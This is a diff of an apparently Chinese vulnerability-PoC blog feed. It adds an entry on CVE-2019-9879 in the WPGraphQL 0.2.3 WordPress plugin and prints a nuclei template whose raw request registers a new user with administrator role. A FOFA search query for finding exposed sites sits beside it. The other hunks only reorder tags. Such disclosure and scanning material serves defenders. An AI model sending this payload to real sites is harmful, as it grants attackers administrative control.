@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>WPGraphQL 用户创建漏洞</title>
+    <link href="/2025/06/10/github_3024505703/"/>
+    <url>/2025/06/10/github_3024505703/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> WPGraphQL 用户创建漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-9879</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> WPGraphQL 0.2.3插件允许远程攻击者在允许新用户注册时，注册一个具有管理员权限的新用户。这与registerUser突变有关。</p><p><strong>产品厂商：</strong> wpengine</p><p><strong>产品名称：</strong> WPGraphQL</p><p><strong>影响版本：</strong> 0.2.3</p><p><strong>搜索语法：</strong> body&#x3D;”&#x2F;wp-content&#x2F;plugins&#x2F;wp-graphql&#x2F;“</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/5873802a123fe14a2de052a45478b9b3da8b19b7/http%2Fcves%2F2019%2FCVE-2019-9879.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/5873802a123fe14a2de052a45478b9b3da8b19b7/http%2Fcves%2F2019%2FCVE-2019-9879.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">9879</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> WPGraphQL <span class="hljs-number">0.2</span>.<span class="hljs-number">3</span> <span class="hljs-operator">-</span> User Creation<br>  <span class="hljs-params">author:</span> DhiyaneshDk<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    The WPGraphQL <span class="hljs-number">0.2</span>.<span class="hljs-number">3</span> plugin for WordPress allows remote attackers to register a new user <span class="hljs-keyword">with</span> admin privileges, whenever new user registrations are allowed. This is related to the registerUser mutation.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/wp-graphql/wp-graphql/releases/tag/v0.3.0</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/pentestpartners/snippets/blob/master/wp-graphql0.2.3_exploit.py</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>wpscan.com<span class="hljs-operator">/</span>vulnerability<span class="hljs-operator">/</span><span class="hljs-number">2</span>d451c89-<span class="hljs-number">91</span>ce-<span class="hljs-number">415</span>1-b3fb-<span class="hljs-number">56</span>af15869644<span class="hljs-symbol">/</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">9879</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">306</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.54977</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.97885</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:wpengine:wpgraphql:<span class="hljs-number">0.2</span>.<span class="hljs-number">3</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:wordpress:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">vendor:</span> wpengine<br>    <span class="hljs-params">product:</span> wpgraphql<br>    <span class="hljs-params">framework:</span> wordpress<br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">fofa-query:</span> body<span class="hljs-operator">=</span><span class="hljs-string">&quot;/wp-content/plugins/wp-graphql/&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2019,wp-graphql,wpengine,wordpress,wp-plugin,intrusive,kev<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">username:</span> <span class="hljs-string">&quot;&#123;&#123;to_lower(rand_text_alphanumeric(6))&#125;&#125;&quot;</span><br>  <span class="hljs-params">password:</span> <span class="hljs-string">&quot;&#123;&#123;rand_text_alphanumeric(12)&#125;&#125;&quot;</span><br>  <span class="hljs-params">user_email:</span> <span class="hljs-string">&quot;&#123;&#123;username&#125;&#125;@&#123;&#123;to_lower(rand_text_alphanumeric(6))&#125;&#125;.com&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-type:</span> application<span class="hljs-symbol">/json</span><br><br>        &#123;<span class="hljs-string">&quot;query&quot;</span>: <span class="hljs-string">&quot;mutation&#123;registerUser(input:&#123;clientMutationId:<span class="hljs-char escape_">\&quot;</span>UWHATM8<span class="hljs-char escape_">\&quot;</span>,email:<span class="hljs-char escape_">\&quot;</span>&#123;&#123;user_email&#125;&#125;<span class="hljs-char escape_">\&quot;</span>,password:<span class="hljs-char escape_">\&quot;</span>&#123;&#123;password&#125;&#125;<span class="hljs-char escape_">\&quot;</span>,username:<span class="hljs-char escape_">\&quot;</span>&#123;&#123;username&#125;&#125;<span class="hljs-char escape_">\&quot;</span>,roles:[<span class="hljs-char escape_">\&quot;</span>administrator<span class="hljs-char escape_">\&quot;</span>]&#125;)&#123;clientMutationId&#125;&#125;&quot;</span>&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> status_code <span class="hljs-operator">==</span> <span class="hljs-number">200</span><br>          <span class="hljs-operator">-</span> contains(content_type, &#x27;application<span class="hljs-operator">/</span>json&#x27;)<br>          <span class="hljs-operator">-</span> contains_all(body, &#x27;UWHATM8&#x27;, &#x27;&#123;\<span class="hljs-string">&quot;status<span class="hljs-char escape_">\&quot;</span>:&#x27;)</span><br><span class="hljs-string">        condition: and</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>projectdiscovery/nuclei-templates:github issues</tag>
+      
+      <tag>权限绕过</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>SonLogger 任意文件上传漏洞</title>
     <link href="/2025/06/10/github_3313124201/"/>
     <url>/2025/06/10/github_3313124201/</url>
@@ -47,9 +74,9 @@
     
     <tags>
       
-      <tag>反序列化</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>反序列化</tag>
       
     </tags>
     
@@ -232,9 +259,9 @@
     
     <tags>
       
-      <tag>反序列化</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>反序列化</tag>
       
     </tags>
     
@@ -444,9 +471,9 @@
     
     <tags>
       
-      <tag>反序列化</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>反序列化</tag>
       
     </tags>
     
@@ -679,9 +706,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -2179,9 +2206,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -3232,9 +3259,9 @@
     
     <tags>
       
-      <tag>未授权访问</tag>
-      
       <tag>rapid7/metasploit-framework:github issues</tag>
+      
+      <tag>未授权访问</tag>
       
     </tags>
     
@@ -3313,9 +3340,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -3340,9 +3367,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -3421,9 +3448,9 @@
     
     <tags>
       
-      <tag>未授权访问</tag>
-      
       <tag>rapid7/metasploit-framework:github issues</tag>
+      
+      <tag>未授权访问</tag>
       
     </tags>
     
@@ -3988,9 +4015,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -4040,9 +4067,9 @@
     
     <tags>
       
-      <tag>未授权访问</tag>
-      
       <tag>rapid7/metasploit-framework:github issues</tag>
+      
+      <tag>未授权访问</tag>
       
     </tags>
     
@@ -4742,9 +4769,9 @@
     
     <tags>
       
-      <tag>跨站可执行脚本</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>跨站可执行脚本</tag>
       
     </tags>
     
@@ -5282,9 +5309,9 @@
     
     <tags>
       
-      <tag>反序列化</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>反序列化</tag>
       
     </tags>
     
@@ -5444,9 +5471,9 @@
     
     <tags>
       
-      <tag>跨站可执行脚本</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>跨站可执行脚本</tag>
       
     </tags>
     
@@ -5579,9 +5606,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -5687,9 +5714,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -7897,9 +7924,9 @@
     
     <tags>
       
-      <tag>反序列化</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>反序列化</tag>
       
     </tags>
     
@@ -8485,9 +8512,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -8832,9 +8859,9 @@
     
     <tags>
       
-      <tag>CVE-2024:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2024:github search</tag>
       
     </tags>
     
@@ -9094,9 +9121,9 @@
     
     <tags>
       
-      <tag>跨站可执行脚本</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>跨站可执行脚本</tag>
       
     </tags>
     
@@ -9254,9 +9281,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -9362,9 +9389,9 @@
     
     <tags>
       
-      <tag>未授权访问</tag>
-      
       <tag>rapid7/metasploit-framework:github issues</tag>
+      
+      <tag>未授权访问</tag>
       
     </tags>
     
